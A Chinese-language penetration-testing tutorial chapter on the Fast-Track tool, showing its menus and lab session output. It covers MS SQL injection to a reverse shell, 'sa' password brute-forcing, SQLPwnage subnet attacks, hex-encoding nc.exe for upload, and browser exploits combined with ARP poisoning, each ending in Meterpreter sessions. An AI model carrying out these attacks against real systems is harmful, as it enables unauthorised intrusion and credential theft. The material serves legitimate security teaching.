## 第十一章。Fast-Track

Fast-Track 是一个基于 Python 的开源工具，用于增强高级渗透测试技术。Fast-Track 使用 Metasploit 框架进行有效载荷交付和客户端攻击向量。它通过添加额外的功能来补充 Metasploit，包括 Microsoft SQL 攻击、更多漏洞利用和浏览器攻击向量。Fast-Track 由 Dave Kennedy 创建，Andrew Weidenhamer、John Melvin 和 Scott White 做出了贡献。目前由 Joey Furr（j0fer）更新和维护。

Fast-Track 的交互模式是使用它的方式。要进入交互模式，如下所示，使用**`./fast-track.py -i`**（这与 SET 使用的命令类似）。通过发布不同的选项和序列，您可以自定义您的攻击、目标等。（您也可以使用`./fast-track.py -g`来加载 Web 界面。）

```
oot@bt4:/pentest/exploits/fasttrack# `./fast-track.py -i`

 ***********************************************
 ******* Performing dependency checks... *******
 ***********************************************

 *** FreeTDS and PYMMSQL are installed. (Check) ***
 *** PExpect is installed. (Check) ***
 *** ClientForm is installed. (Check) ***
 *** Psyco is installed. (Check) ***
 *** Beautiful Soup is installed. (Check) ***
 *** PyMills is installed. (Check) ***

 Also ensure ProFTP, WinEXE, and SQLite3 is installed from
 the Updates/Installation menu.

 Your system has all requirements needed to run Fast-Track!

 Fast-Track Main Menu:

 Fast-Track - Where it's OK to finish in under 3 minutes...
 Version: v4.0
 Written by: David Kennedy (ReL1K)

 1\.  Fast-Track Updates
 2\.  Autopwn Automation
 3\.  Microsoft SQL Tools
 4\.  Mass Client-Side Attack
 5\.  Exploits
 6\.  Binary to Hex Payload Converter
 7\.  Payload Generator
 8\.  Fast-Track Tutorials
 9\.  Fast-Track Changelog
 10\. Fast-Track Credits
 11\. Exit

 Enter the number:
```

尽管我们将在本章中只介绍所选的一些内容，但您可以在 Fast-Track 主菜单上看到攻击和功能的一般类别。我们将探讨一些最有用的技巧，重点是利用 Microsoft SQL。例如，Autopwn Automation 菜单简化了 Metasploit 的 autopwn 功能的过程——只需输入 IP 地址，Fast-Track 就会为您设置一切。Exploits 菜单包含 Metasploit 中未包含的额外漏洞利用。

## Microsoft SQL 注入

*SQL 注入（SQLi）攻击*通过利用不安全的代码将 SQL 命令附加到攻击 Web 应用。SQL 查询可以通过受信任的 Web 服务器插入到后端数据库中，以在数据库上执行命令。Fast-Track 通过专注于 Web 应用中的查询字符串和 POST 参数来自动化执行高级 SQL 注入攻击的过程。以下攻击依赖于攻击者知道目标网站上存在 SQL 注入，并且知道哪个参数是易受攻击的。这种攻击仅在基于 MS SQL 的系统上有效。

### SQL 注入器 — 查询字符串攻击

通过从主菜单中选择`Microsoft SQL Tools`然后选择`MSSQL Injector` ![](img/00002.gif)开始攻击设置，如下所示。

```
Pick a list of the tools from below:

 1\. MSSQL Injector
  2\. MSSQL Bruter
  3\. SQLPwnage

  Enter your choice : `1`
```

最简单的 SQL 注入形式是在查询字符串中，通常从浏览器发送到服务器的 URL 字段中发送。这个 URL 字符串通常可以包含参数，告诉动态网站正在请求什么信息。Fast-Track 通过在易受攻击的查询字符串参数中插入一个"`INJECTHERE`"来区分要攻击的字段，如下所示：

```
http://www.secmaniac.com/index.asp?id='INJECTHERE&date=2011
```

当 Fast-Track 开始利用这个漏洞时，它将在所有字段中寻找`id`字符串以确定要攻击的字段。让我们通过选择第一个选项，`查询字符串参数攻击`，来看看这个动作。

```
Enter which SQL Injector you want to use

 1\. SQL Injector - Query String Parameter Attack
  2\. SQL Injector - POST Parameter Attack
  3\. SQL Injector - GET FTP Payload Attack
  4\. SQL Injector - GET Manual Setup Binary Payload Attack

  Enter your choice: `1`

  `. . . SNIP . . .`

  Enter the URL of the susceptible site, remember to put 'INJECTHERE for the
  injectable parameter

  Example:http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah

 Enter here: `http://www.secmaniac.com/index.asp?id='INJECTHERE&date=2011`
  Sending initial request to enable xp_cmdshell if disabled...
  Sending first portion of payload (1/4)...
  Sending second portion of payload (2/4)...
  Sending third portion of payload (3/4)...
  Sending the last portion of the payload (4/4)...
  Running cleanup before executing the payload...
  Running the payload on the server...Sending initial request to enable
  xp_cmdshell if disabled...
  Sending first portion of payload (1/4)...
  Sending second portion of payload (2/4)...
  Sending third portion of payload (3/4)...
  Sending the last portion of the payload (4/4)...
  Running cleanup before executing the payload...
  Running the payload on the server...
  listening on [any] 4444 ...
  connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1041
  Microsoft Windows [Version 5.2.3790]
  (C) Copyright 1985-2003 Microsoft Corp.

  C:\WINDOWS\system32>
```

成功！系统完全访问权限通过 SQL 注入获得。

注意，如果正在使用参数化 SQL 查询或存储过程，则此攻击不会成功。还要注意，此攻击所需的配置非常简单。从攻击菜单中选择`SQL 注入器 - 查询字符串参数攻击` ![](img/00002.gif)，只需将 Fast-Track 指向 SQL 注入点 ![](img/00004.gif)。如果`xp_cmdshell`存储过程被禁用，Fast-Track 将自动重新启用它并尝试 MS SQL 的权限提升。

### SQL 注入器 — POST 参数攻击

Fast-Track 的 POST 参数攻击比前面的查询字符串参数攻击需要更少的配置。为此攻击，只需传递 Fast-Track 你想要攻击的网站的 URL，它将自动检测要攻击的表单。

```
Enter which SQL Injector you want to use

1\. SQL Injector - Query String Parameter Attack
2\. SQL Injector - POST Parameter Attack
3\. SQL Injector - GET FTP Payload Attack
4\. SQL Injector - GET Manual Setup Binary Payload Attack

Enter your choice: `2`

This portion allows you to attack all forms on a specific
 website without having to specify
each parameter. Just type the URL in, and Fast-Track will auto
 SQL inject to each parameter
looking for both error based injection as well as blind
 based SQL injection. Simply type
the website you want to attack, and let it roll.

Example: http://www.sqlinjectablesite.com/index.aspx

Enter the URL to attack: `http://www.secmaniac.com`

Forms detected...attacking the parameters in hopes of exploiting SQL Injection..

Sending payload to parameter: txtLogin

Sending payload to parameter: txtPassword

[-] The PAYLOAD is being delivered. This can take up to two minutes. [-]

listening on [any] 4444 ...
connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1041
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>
```

正如你所见，Fast-Track 处理了 POST 参数的自动检测和注入攻击，完全通过 SQL 注入使受影响的系统受到破坏。

***

### 注意

你也可以使用 FTP 来交付你的有效载荷，尽管 FTP 通常在基于出站连接的情况下被阻止。

***

### 手动注入

如果你有一个不同的 IP 地址在监听反向 shell，或者你需要微调一些配置设置，你可以手动设置注入器。

```
Enter which SQL Injector you want to use

  1\. SQL Injector - Query String Parameter Attack
  2\. SQL Injector - POST Parameter Attack
  3\. SQL Injector - GET FTP Payload Attack
 4\. SQL Injector - GET Manual Setup Binary Payload Attack

  Enter your choice: `4`

  The manual portion allows you to customize your attack for whatever reason.

  You will need to designate where in the URL the SQL Injection is by using
  'INJECTHERE

  So for example, when the tool asks you for the SQL Injectable URL, type:

  http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah

  Enter the URL of the susceptible site, remember to put 'INJECTHERE for the
  injectible parameter

  Example: http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah

 Enter here: `http://www.secmaniac.com/index.asp?id=`'`INJECTHERE&date=2010`
 Enter the IP Address of server with NetCat Listening: `10.211.55.130`
 Enter Port number with NetCat listening: `9090`

  Sending initial request to enable xp_cmdshell if disabled....
  Sending first portion of payload....
  Sending second portion of payload....
  Sending next portion of payload...
  Sending the last portion of the payload...
  Running cleanup...
  Running the payload on the server...
  listening on [any] 9090 ...
  10.211.55.128: inverse host lookup failed: Unknown server error : Connection
       timed out
  connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1045
  Microsoft Windows [Version 5.2.3790]
  (C) Copyright 1985-2003 Microsoft Corp.

  C:\WINDOWS\system32>
```

首先，在![](img/00002.gif)处选择手动选项。然后，就像在查询字符串参数攻击中一样，将 Fast-Track 指向易受 SQL 注入的参数 ![](img/00004.gif)，并在![](img/00005.gif)处输入你的监听 IP 地址，以及你的目标要连接到的端口 ![](img/00006.gif)。Fast-Track 会处理其余部分。

### MSSQL Bruter

也许 Fast-Track 最好的一个方面就是*MSSQL Bruter*（可在 Microsoft SQL 攻击工具菜单中找到）。当 MS SQL 安装时，MSSQL Bruter 可以使用集成 Windows 身份验证、SQL 身份验证或混合模式身份验证。

混合模式身份验证允许用户从 Windows 身份验证以及直接从 MS SQL 服务器进行验证。如果在安装 MS SQL 时使用混合模式或 SQL 身份验证，安装软件的管理员需要为 MS SQL 指定一个*sa*，或系统管理员，账户。通常，管理员会选择一个弱、空或容易被猜到的密码，这可能会被攻击者利用。如果*sa*账户可以被暴力破解，它将通过扩展存储过程`xp_cmdshell`导致整个系统的妥协。

Fast-Track 在寻找 MS SQL 服务器时使用了一些发现方法，包括使用*nmap*对默认的 MS SQL TCP 端口 1433 进行端口扫描。如果目标机器正在使用 MS SQL Server 2005 或更高版本，可以使用动态端口范围，这使得枚举更加困难，但 Fast-Track 直接与 Metasploit 接口，可以查找端口号为 1434 的用户数据报协议（UDP），以揭示 MS SQL 服务器动态端口的运行端口。

一旦 Fast-Track 识别了一个服务器并成功暴力破解了*sa*账户，它将使用高级二进制到十六进制转换方法来传递有效载荷。这种攻击通常非常成功，尤其是在 MS SQL 广泛使用的大型环境中。

以下是初始攻击：

```
Microsoft SQL Attack Tools

Pick a list of the tools from below:

1\. MSSQL Injector
2\. MSSQL Bruter
3\. SQLPwnage

Enter your choice : `2`

  Enter the IP Address and Port Number to Attack.

  Options: (a)ttempt SQL Ping and Auto Quick Brute Force
           (m)ass scan and dictionary brute
           (s)ingle Target (Attack a Single Target with big dictionary)
           (f)ind SQL Ports (SQL Ping)
           (i) want a command prompt and know which system is vulnerable
           (v)ulnerable system, I want to add a local admin on the box...
           (e)nable xp_cmdshell if its disabled (sql2k and sql2k5)
```

在我们选择`MSSQL Bruter`选项后，Fast-Track 向我们展示了一系列可以进行的攻击。并非所有这些攻击在每种情况下都有效，或者甚至服务于相同的目的，因此确保您理解每个选项所发生的情况非常重要。

Fast-Track 有几个选项：

+   尝试 SQL Ping 和自动快速暴力破解尝试使用与*nmap*相同的语法和内置预定义的密码列表扫描一系列 IP 地址。

+   大规模扫描和字典暴力破解扫描一系列 IP 地址，并允许您指定自己的单词列表。Fast-Track 附带一个位于*bin/dict/wordlist.txt*的合理单词列表。

+   单目标允许您使用大型单词列表暴力破解一个特定的 IP 地址。

+   查找 SQL 端口（SQL Ping）仅寻找 SQL 服务器，而不会攻击它们。

+   如果您已知*sa*密码，则“我想要命令提示符”会为您打开一个命令提示符。

+   易受攻击的系统……在您已知易受攻击的机器上添加一个新的管理员用户。

+   启用`xp_cmdshell`……是 Fast-Track 用来执行底层系统命令的存储过程。默认情况下，它从 SQL Server 2005 版本开始被禁用，但 Fast-Track 可以自动重新启用。在攻击任何远程系统时，Fast-Track 将自动尝试重新启用`xp_cmdshell`，以防万一。

您可以使用并自定义多个选项以达到目标，其中最简单的是快速暴力破解，这通常不会被检测到。我们将使用内置密码的子集选择快速暴力破解选项，并尝试猜测 MS SQL 服务器上的密码。

```
Enter the IP Address and Port Number to Attack.

   Options: (a)ttempt SQL Ping and Auto Quick Brute Force
             (m)ass scan and dictionary brute
             (s)ingle Target (Attack a Single Target with big dictionary)
             (f)ind SQL Ports (SQL Ping)
             (i) want a command prompt and know which system is vulnerable
             (v)ulnerable system, I want to add a local admin on the box...
             (e)nable xp_cmdshell if its disabled (sql2k and sql2k5)

    Enter Option: `a`
 Enter username for SQL database (example:sa): `sa`
  Configuration file not detected, running default path.
  Recommend running setup.py install to configure Fast-Track.
  Setting default directory...
 Enter the IP Range to scan for SQL Scan (example 192.168.1.1-255):
       `10.211.55.1/24`

  Do you want to perform advanced SQL server identification on non-standard
  SQL ports? This will use UDP footprinting in order to determine where the SQL
  servers are at. This could take quite a long time.

 Do you want to perform advanced identification, yes or no: `yes`

  [-] Launching SQL Ping, this may take a while to footprint.... [-]

  [*] Please wait while we load the module tree...
  Brute forcing username: sa

  Be patient this could take awhile...

  Brute forcing password of password2 on IP 10.211.55.128:1433
  Brute forcing password of  on IP 10.211.55.128:1433
  Brute forcing password of password on IP 10.211.55.128:1433

  SQL Server Compromised: "sa" with password of: "password" on IP
  10.211.55.128:1433

  Brute forcing password of sqlserver on IP 10.211.55.128:1433
  Brute forcing password of sql on IP 10.211.55.128:1433
  Brute forcing password of password1 on IP 10.211.55.128:1433
  Brute forcing password of password123 on IP 10.211.55.128:1433
  Brute forcing password of complexpassword on IP 10.211.55.128:1433
  Brute forcing password of database on IP 10.211.55.128:1433
  Brute forcing password of server on IP 10.211.55.128:1433
  Brute forcing password of changeme on IP 10.211.55.128:1433
  Brute forcing password of change on IP 10.211.55.128:1433
  Brute forcing password of sqlserver2000 on IP 10.211.55.128:1433
  Brute forcing password of sqlserver2005 on IP 10.211.55.128:1433
  Brute forcing password of Sqlserver on IP 10.211.55.128:1433
  Brute forcing password of SqlServer on IP 10.211.55.128:1433
  Brute forcing password of Password1 on IP 10.211.55.128:1433

  `. . . SNIP . . .`

  *******************************************
  The following SQL Servers were compromised:
  *******************************************

  1\. 10.211.55.128:1433 *** U/N: sa P/W: password ***

  *******************************************

  To interact with system, enter the SQL Server number.

  Example: 1\. 192.168.1.32 you would type 1

  Enter the number:
```

在选择“尝试 SQL Ping 和自动快速暴力破解”后！[](../images/00002.gif)，您将被提示输入 SQL 数据库用户名！[](../images/00004.gif)，然后是您想要扫描的 IP 地址范围！[](../images/00005.gif)。当被问及是否要执行高级服务器识别时！[](../images/00006.gif)，请回答**`yes`**。虽然速度较慢，但可能非常有效。

前面的输出显示 Fast-Track 成功暴力破解了一个用户名为*sa*、密码为*password*的系统。在此阶段，您可以选择有效载荷并破坏系统，如下所示。

```
Enter number here: `1`

Enabling: XP_Cmdshell...
Finished trying to re-enable xp_cmdshell stored procedure if disabled.

Configuration file not detected, running default path.
Recommend running setup.py install to configure Fast-Track.
Setting default directory...
What port do you want the payload to connect to you on: `4444`
Metasploit Reverse Meterpreter Upload Detected..
Launching Meterpreter Handler.
Creating Metasploit Reverse Meterpreter Payload..
Sending payload: c88f3f9ac4bbe0e66da147e0f96efd48dad6
Sending payload: ac8cbc47714aaeed2672d69e251cee3dfbad
Metasploit payload delivered..
Converting our payload to binary, this may take a few...
Cleaning up...
Launching payload, this could take up to a minute...
When finished, close the metasploit handler window to return to other
compromised SQL Servers.
[*] Please wait while we load the module tree...
[*] Handler binding to LHOST 0.0.0.0
[*] Started reverse handler
[*] Starting the payload handler...
[*] Transmitting intermediate stager for over-sized stage...(216 bytes)
[*] Sending stage (718336 bytes)
[*] Meterpreter session 1 opened (10.211.55.130:4444 -> 10.211.55.128:1030)

meterpreter >
```

您现在应该可以使用 Meterpreter 有效载荷完全访问该机器。

### SQLPwnage

*SQLPwnage*是一种大量暴力攻击，可用于针对 Web 应用程序尝试发现 Microsoft SQL 注入。SQLPwnage 将扫描子网上的 80 端口 Web 服务器，爬取网站，并尝试模糊测试 POST 参数，直到找到 SQL 注入。它支持基于错误和盲目的 SQL 注入，并将处理从权限提升到重新启用`xp_cmdshell`存储过程，绕过 Windows 调试 64KB 限制，并将任何您想要放置到系统上的有效载荷。

通过从 Fast-Track 主菜单中选择`Microsoft SQL 工具`开始此攻击的配置，然后选择`SQLPwnage`，选项 2，如下所示。

```
SQLPwnage Main Menu:

  1\. SQL Injection Search/Exploit by Binary Payload Injection (BLIND)
 2\. SQL Injection Search/Exploit by Binary Payload Injection (ERROR BASED)
  3\. SQL Injection single URL exploitation

  Enter your choice: `2`

  `. . . SNIP . . .`

  Scan a subnet or spider single URL?

  1\. url
 2\. subnet (new)
  3\. subnet (lists last scan)

  Enter the Number: `2`

  Enter the ip range, example 192.168.1.1-254: `10.211.55.1-254`
  Scanning Complete!!! Select a website to spider or spider all??

  1\. Single Website
 2\. All Websites

  Enter the Number: `2`

  Attempting to Spider: http://10.211.55.128
  Crawling http://10.211.55.128 (Max Depth: 100000)
  DONE
  Found 0 links, following 0 urls in 0+0:0:0
  Spidering is complete.

  *************************************************************************
  http://10.211.55.128
  *************************************************************************

  [+] Number of forms detected: 2 [+]

 A SQL Exception has been encountered in the "txtLogin" input field of the
       above website.
```

根据网站在尝试 SQL 注入时是否显示错误，您需要在`BLIND`和`ERROR BASED`攻击之间进行选择。在 ![](img/00002.gif) 我们选择`ERROR BASED`，因为该网站足够友好，在执行 SQL 查询时遇到麻烦时会回传错误信息。

接下来，选择是爬取单个 URL 还是扫描整个子网 ![](img/00004.gif)。在扫描子网后，我们选择攻击 Fast-Track 找到的所有网站 ![](img/00005.gif)。如您所见，扫描所有找到的网站在一个网站上发现了一个有漏洞的表单 ![](img/00006.gif)。

最终的配置步骤要求您选择一个有效载荷。在以下示例中，您选择`Metasploit 反射式反向 TCP Meterpreter` ![](img/00002.gif) 以及您希望攻击机器监听的端口 ![](img/00004.gif)。在 Fast-Track 成功利用 SQL 注入漏洞后，它会向目标发送一个分块有效载荷 ![](img/00005.gif)，并最终向您展示您的 Meterpreter 外壳 ![](img/00006.gif)。

```
What type of payload do you want?

  1\. Custom Packed Fast-Track Reverse Payload (AV Safe)
  2\. Metasploit Reverse VNC Inject (Requires Metasploit)
  3\. Metasploit Meterpreter Payload (Requires Metasploit)
  4\. Metasploit TCP Bind Shell (Requires Metasploit)
  5\. Metasploit Meterpreter Reflective Reverse TCP
  6\. Metasploit Reflective Reverse VNC

 Select your choice: `5`
 Enter the port you want to listen on: `9090`
  [+] Importing 64kb debug bypass payload into Fast-Track... [+]
  [+] Import complete, formatting the payload for delivery.. [+]
  [+] Payload Formatting prepped and ready for launch. [+]
  [+] Executing SQL commands to elevate account permissions. [+]
  [+] Initiating stored procedure: 'xp_cmdhshell' if disabled. [+]
  [+] Delivery Complete. [+]
  Created by msfpayload (http://www.metasploit.com).
  Payload: windows/patchupmeterpreter/reverse_tcp
  Length: 310
  Options: LHOST=10.211.55.130,LPORT=9090
  Launching MSFCLI Meterpreter Handler
  Creating Metasploit Reverse Meterpreter Payload..
  Taking raw binary and converting to hex.
  Raw binary converted to straight hex.
 [+] Bypassing Windows Debug 64KB Restrictions. Evil. [+]

  `. . . SNIP . . .`

  Running cleanup before launching the payload....
  [+] Launching the PAYLOAD!! This may take up to two or three minutes. [+]
  [*] Please wait while we load the module tree...
  [*] Handler binding to LHOST 0.0.0.0
  [*] Started reverse handler
  [*] Starting the payload handler...
  [*] Transmitting intermediate stager for over-sized stage...(216 bytes)
  [*] Sending stage (2650 bytes)
  [*] Sleeping before handling stage...
  [*] Uploading DLL (718347 bytes)...
  [*] Upload completed.
 [*] Meterpreter session 1 opened (10.211.55.130:9090 -> 10.211.55.128:1031)

  meterpreter >
```

## 二进制到十六进制生成器

当您已经可以访问系统并且想要向远程文件系统交付一个可执行文件时，二进制到十六进制生成器非常有用。将 Fast-Track 指向可执行文件，它将生成一个文本文件，您可以复制并粘贴到目标操作系统上。要将十六进制转换回二进制并执行它，请选择如下 ![](img/00002.gif) 所示的选项 6。

```
 Enter the number: `6`
  Binary to Hex Generator v0.1

  `. . . SNIP . . .`

 Enter the path to the file you
 want to convert to hex: `/pentest/exploits/fasttrack/nc.exe`

  Finished...
  Opening text editor...

  // Output will look like this

 DEL T 1>NUL 2>NUL
  echo EDS:0 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00>>T
  echo EDS:10 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00>>T
  echo FDS:20 L 10 00>>T
  echo EDS:30 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00>>T
  echo EDS:40 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68>>T
  echo EDS:50 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F>>T
  echo EDS:60 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20>>T
  echo EDS:70 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00>>T
```

在选择`二进制到十六进制有效载荷转换器`后，将 Fast-Track 指向您想要转换的二进制文件 ![](img/00004.gif) 并等待魔法发生。此时，您可以直接将 ![](img/00005.gif) 中的输出复制并粘贴到现有的 shell 窗口中。

## 大量客户端攻击

*大量客户端攻击*与*浏览器自动攻击*功能类似；然而，这种攻击包括额外的漏洞利用和内置功能，可以在目标机器上集成 ARP 缓存和 DNS 投毒，以及 Metasploit 中未包含的额外浏览器漏洞。

当用户连接到您的 Web 服务器时，Fast-Track 将启动其武器库中的每个漏洞利用程序以及 Metasploit 框架中的漏洞利用程序。如果用户的机器容易受到这些库中特定漏洞的影响，攻击者将获得对目标机器的完全访问权限。

```
 Enter the number: `4`

  `. . . SNIP . . .`

 Enter the IP Address you want the web server to listen on: `10.211.55.130`

  Specify your payload:

  1\. Windows Meterpreter Reverse Meterpreter
  2\. Generic Bind Shell
  3\. Windows VNC Inject Reverse_TCP (aka "Da Gui")
  4\. Reverse TCP Shell

 Enter the number of the payload you want: `1`
```

在主菜单中选择选项 4，`大规模客户端攻击` ![图片 1](img/00002.gif)，告诉 Fast-Track Web 服务器应该监听哪个 IP 地址 ![图片 2](img/00004.gif)，然后选择一个有效载荷 ![图片 3](img/00005.gif)。

接下来，决定是否使用 Ettercap 来 ARP 中毒您的目标机器。Ettercap 将拦截目标发出的所有请求并将它们重定向到您的恶意服务器。在确认您想在 ![图片 1](img/00002.gif) 使用 Ettercap 后，输入您想要中毒的目标的 IP 地址 ![图片 2](img/00004.gif)。然后 Fast-Track 将为您设置 Ettercap ![图片 3](img/00005.gif)。

```
 Would you like to use Ettercap to ARP poison a host yes or no: `yes`

  `. . . SNIP . . .`

 What IP Address do you want to poison: `10.211.55.128`
  Setting up the ettercap filters....
  Filter created...
  Compiling Ettercap filter...

  `. . . SNIP . . .`

 Filter compiled...Running Ettercap and poisoning target...
```

一旦客户端连接到您的恶意服务器，Metasploit 就会在目标上启动漏洞利用程序 ![图片 1](img/00002.gif)。在下面的列表中，您可以看到 Adobe 漏洞利用程序是成功的，并且有一个 Meterpreter shell 等待 ![图片 2](img/00004.gif)。

* * *

### 注意

您可以在这次攻击中使用 ARP 缓存中毒，但这仅在您与目标处于同一本地且不受限制的子网时才会有效。

* * *

```
[*] Local IP: http://10.211.55.130:8071/
  [*] Server started.
  [*] Handler binding to LHOST 0.0.0.0
  [*] Started reverse handler
  [*] Exploit running as background job.
  [*] Using URL: http://0.0.0.0:8072/
  [*] Local IP: http://10.211.55.130:8072/
  [*] Server started.
  msf exploit(zenturiprogramchecker_unsafe) >
  [*] Handler binding to LHOST 0.0.0.0
  [*] Started reverse handler
  [*] Using URL: http://0.0.0.0:8073/
  [*] Local IP: http://10.211.55.130:8073/
  [*] Server started.
 [*] Sending Adobe Collab.getIcon() Buffer Overflow to 10.211.55.128:1044...
  [*] Attempting to exploit ani_loadimage_chunksize
  [*] Sending HTML page to 10.211.55.128:1047...
  [*] Sending Adobe JBIG2Decode Memory Corruption Exploit to 10.211.55.128:1046...
  [*] Sending exploit to 10.211.55.128:1049...
  [*] Attempting to exploit ani_loadimage_chunksize
  [*] Sending Windows ANI LoadAniIcon() Chunk Size Stack Overflow (HTTP) to
       10.211.55.128:1076...
  [*] Transmitting intermediate stager for over-sized stage...(216 bytes)
  [*] Sending stage (718336 bytes)
 [*] Meterpreter session 1 opened (10.211.55.130:9007 -> 10.211.55.128:1077
  msf exploit(zenturiprogramchecker_unsafe) > sessions -l

  Active sessions
  ===============

  Id Description Tunnel
  -- ----------- ------
  1 Meterpreter 10.211.55.130:9007 -> 10.211.55.128:1077

  msf exploit(zenturiprogramchecker_unsafe) > sessions -i 1
  [*] Starting interaction with 1...

  meterpreter >
```

## 关于自动化的几点说明

Fast-Track 提供了丰富的利用功能，这些功能扩展了功能丰富的 Metasploit 框架。当与 Metasploit 结合使用时，它将允许您使用高级攻击向量来完全控制目标机器。当然，自动化的攻击向量并不总是成功的，这就是为什么您必须了解您正在攻击的系统，并确保在攻击时，您知道其成功的可能性。如果自动化工具失败，您手动执行测试并成功攻击目标系统的能力将使您成为一个更好的渗透测试员。
